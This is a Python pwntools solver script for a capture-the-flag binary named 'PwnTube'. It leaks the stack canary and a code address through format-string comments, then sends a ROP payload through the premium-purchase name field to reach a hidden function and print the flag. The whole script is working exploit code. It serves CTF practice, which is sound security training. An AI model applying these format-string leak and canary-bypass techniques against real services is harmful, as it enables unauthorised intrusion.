#!/usr/bin/env python3

from pwn import *

exe = ELF("./PwnTube")

context.binary = exe
remote_address = 'localhost'
port = 1337


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        # GDB code 
        r = gdb.debug(exe.path, '''
        
        
        ''')
    else:
        r = remote(remote_address, port)

    return r

def menu_choice(r, choice):
    r.sendline(str(choice).encode())

def get_nth_comment(r, n_comment):
    menu_choice(r, 3)
    r.recvuntil(b'Comments')
    r.recvlines(2)
    comments = r.recvuntil(b'1. Play').split(b'\n')[:-2]

    return comments[n_comment-1]

def add_comment(r, comment):
    menu_choice(r, 4)
    r.sendline(comment)

def buy_premium(r, name, card_number):
    menu_choice(r, 5)
    menu_choice(r, 2)

    r.recvuntil(b'name:')
    r.sendline(name)
    r.recvuntil(b'number:')
    r.sendline(card_number)

def main():
    
    r = conn()

    # Init ROP
    add_comment(r, b'%71$p')
    add_comment(r, b'%55$p')
    canary = int(get_nth_comment(r,9), 16)
    leak_main = int(get_nth_comment(r,10), 16)

    menu_choice(r, 777)

    exe.address = leak_main - exe.sym['main']
    rop = ROP(exe)

    # Set offset
    offset = 0x200 - 8

    gadget = 0x15a8+exe.address

    payload = flat(
        b'A' * offset,
        canary,
        rop.ret.address,
        rop.ret.address,
        gadget,
        0,
        0xfeedface,
        0xdeadbeef,
        rop.ret.address,
        rop.ret.address,
        exe.sym['skipAd']
    )


    buy_premium(r, payload, b'srdnlen')
    
    flag = r.recvrepeat(7).split(b'\n')[-2].decode()
    
    print(flag)

    r.close()
    
    


if __name__ == "__main__":
    main()
